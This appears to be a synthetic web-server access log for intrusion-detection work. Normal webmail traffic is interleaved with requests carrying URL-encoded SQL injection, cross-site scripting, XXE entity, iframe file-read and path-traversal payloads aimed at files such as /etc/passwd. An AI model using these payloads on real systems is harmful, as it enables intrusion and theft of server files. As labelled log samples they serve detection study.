192.168.10.81 - - [29/Feb/2020:00:00:02 +0000] "GET /themes/default/graphics/alerts/success.png HTTP/1.1" 200 737 "http://mail.spiral.com/themes/default/screen.css" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
239.76.215.8 - - [14/Feb/2011:22:59:15 +0000] "GET /main9.php?name1=%22%29+or+%28%221%22%3D%221%22%23 HTTP/1.1" 200 1150 "http://www.jones.info/mainpage/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36"
192.168.10.81 - - [29/Feb/2020:00:00:12 +0000] "GET /imp/themes/default/basic/screen.css HTTP/1.1" 200 1955 "http://mail.spiral.com/services/prefs.php?app=imp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
61.62.116.114 - - [14/Feb/2011:22:59:15 +0000] "GET /main11.php?name=%3C%3BIMG+SRC%3D%22%3Bmocha%3A%5Bcode%5D%22%3B%3E%3B HTTP/1.1" 200 1275 "http://www.jones.info/search/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36"
192.168.10.81 - - [29/Feb/2020:00:00:12 +0000] "GET /themes/default/graphics/navi-left-active.png HTTP/1.1" 200 446 "http://mail.spiral.com/themes/default/screen.css" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
192.168.10.81 - - [29/Feb/2020:00:00:12 +0000] "GET /themes/default/graphics/navi-center-active.png HTTP/1.1" 200 370 "http://mail.spiral.com/themes/default/screen.css" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
192.168.10.81 - - [29/Feb/2020:00:00:12 +0000] "GET /themes/default/graphics/navi-right-active.png HTTP/1.1" 200 429 "http://mail.spiral.com/themes/default/screen.css" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
192.168.10.81 - - [29/Feb/2020:00:00:12 +0000] "GET /imp/themes/default/graphics/favicon.ico HTTP/1.1" 200 2026 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
61.242.241.47 - - [14/Feb/2011:22:59:15 +0000] "GET /main5.php?file14=%3Ciframe+width%3D%22420%22+height%3D%22315%22+src%3D%22%2Fetc%2Fapache2%2Fsites-available%2Fdefault%22+frameborder%3D%220%22+allowfullscreen%3E%3C%2Fiframe%3E HTTP/1.1" 200 3678 "http://www.jones.info/main/" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36"
192.168.10.130 - - [29/Feb/2020:00:04:10 +0000] "GET /services/prefs.php?app=horde&group=identities HTTP/1.1" 200 4577 "http://mail.spiral.com/services/prefs.php?app=horde" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/77.0.3865.90 HeadlessChrome/77.0.3865.90 Safari/537.36"
239.76.215.8 - - [14/Feb/2011:22:59:15 +0000] "GET /main9.php?name1=admin%27+or+1%3D1%2F%2A HTTP/1.1" 200 1150 "http://www.jones.info/mainpage/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36"
239.76.215.8 - - [14/Feb/2011:22:59:15 +0000] "GET /main9.php?name1=%22%29+or+%221%22%3D%221 HTTP/1.1" 200 1150 "http://www.jones.info/mainpage/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36"
144.169.55.103 - - [14/Feb/2011:22:59:15 +0000] "GET /main4.php?email=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22ISO-8859-1%22%3F%3E%3C%21DOCTYPE+foo+%5B%3C%21ELEMENT+foo+ANY%3E%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fdev%2Frandom%22%3E%5D%3E%3Cfoo%3E%26xee%3B%3C%2Ffoo%3E HTTP/1.1" 200 4151 "http://www.jones.info/test/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
225.157.126.178 - - [14/Feb/2011:22:59:15 +0000] "GET /register.php?file11=..%2Fconfig.js HTTP/1.1" 200 1223 "http://www.jones.info/mainpage/" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36"
144.169.55.103 - - [14/Feb/2011:22:59:15 +0000] "GET /main4.php?email=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22ISO-8859-1%22%3F%3E%3C%21DOCTYPE+foo+%5B%3C%21ELEMENT+foo+ANY%3E%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fdev%2Frandom%22%3E%5D%3E%3Cfoo%3E%26xee%3B%3C%2Ffoo%3E HTTP/1.1" 200 4151 "http://www.jones.info/test/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
192.168.10.81 - - [29/Feb/2020:00:00:18 +0000] "GET /imp/js/folderprefs.js?v=29c8308baa6508a21e1be9e3345d1287 HTTP/1.1" 200 1185 "http://mail.spiral.com/services/prefs.php?app=imp&group=delmove" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
244.96.75.42 - - [14/Feb/2011:22:59:15 +0000] "GET /main.php?id=%27%27%3B%21--%22%3CXSS%3E%3D%26%7B%28%29%7D HTTP/1.1" 200 3303 "http://www.jones.info/index.html/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0"
192.168.10.81 - - [29/Feb/2020:00:00:31 +0000] "POST /services/prefs.php HTTP/1.1" 200 5785 "http://mail.spiral.com/services/prefs.php?app=imp&group=delmove" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
192.168.10.81 - - [29/Feb/2020:00:00:37 +0000] "POST /services/prefs.php HTTP/1.1" 200 5785 "http://mail.spiral.com/services/prefs.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
88.27.219.176 - - [14/Feb/2011:22:59:15 +0000] "GET /main6.php?file13=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500 HTTP/1.1" 200 2609 "http://www.jones.info/main/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36"
244.96.75.42 - - [14/Feb/2011:22:59:15 +0000] "GET /main.php?id=%3CIMG+LOWSRC%3D%5C%22javascript%3Aalert%28%27XSS%27%29%5C%22%3E HTTP/1.1" 200 3303 "http://www.jones.info/index.html/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0"
